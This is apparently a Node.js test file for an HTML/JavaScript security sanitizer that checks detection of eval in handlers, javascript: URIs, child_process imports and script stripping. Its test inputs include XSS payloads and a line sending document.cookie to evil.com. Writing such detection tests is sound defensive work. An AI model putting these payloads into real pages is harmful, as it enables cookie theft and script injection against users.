import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { scan, sanitize, report } from '../lib/security/sanitizer.js';

describe('Security Sanitizer', () => {
  it('should detect eval in event handlers', () => {
    const result = scan('<div onclick="eval(\'alert(1)\')">');
    assert.equal(result.safe, false);
    assert.ok(result.issues.some(i => i.name === 'eval-in-handler'));
  });

  it('should detect javascript: URIs', () => {
    const result = scan('<a href="javascript:alert(1)">click</a>');
    assert.equal(result.safe, false);
    assert.ok(result.issues.some(i => i.name === 'javascript-uri'));
  });

  it('should detect document.cookie access', () => {
    const result = scan('fetch("https://evil.com?" + document.cookie)');
    assert.equal(result.safe, false);
  });

  it('should detect child_process require', () => {
    const result = scan('const cp = require("child_process")');
    assert.ok(result.issues.some(i => i.severity === 'critical'));
  });

  it('should pass clean code', () => {
    const clean = `
      <html><body>
        <h1>Hello World</h1>
        <script>
          const canvas = document.querySelector('canvas');
          const ctx = canvas.getContext('2d');
          ctx.fillRect(0, 0, 100, 100);
        </script>
      </body></html>
    `;
    const result = scan(clean);
    assert.equal(result.safe, true);
  });

  it('should sanitize with stripDangerous', () => {
    const html = '<a href="javascript:alert(1)">bad</a><iframe src="evil.com"></iframe>';
    const result = sanitize(html, { stripDangerous: true });
    assert.ok(!result.html.includes('javascript:'));
    assert.ok(!result.html.includes('<iframe'));
    assert.ok(result.removed.length >= 2);
  });

  it('should strip scripts when disallowed', () => {
    const html = '<div>ok</div><script>alert(1)</script>';
    const result = sanitize(html, { allowScripts: false });
    assert.ok(!result.html.includes('<script'));
  });

  it('should preserve scripts by default', () => {
    const html = '<script>console.log("ok")</script>';
    const result = sanitize(html);
    assert.ok(result.html.includes('<script'));
  });

  it('should generate readable report', () => {
    const r = report('<div onclick="eval(\'x\')">');
    assert.ok(r.includes('🟠') || r.includes('🚨'));
  });

  it('should report clean code positively', () => {
    const r = report('<div>Hello</div>');
    assert.ok(r.includes('✅'));
  });
});
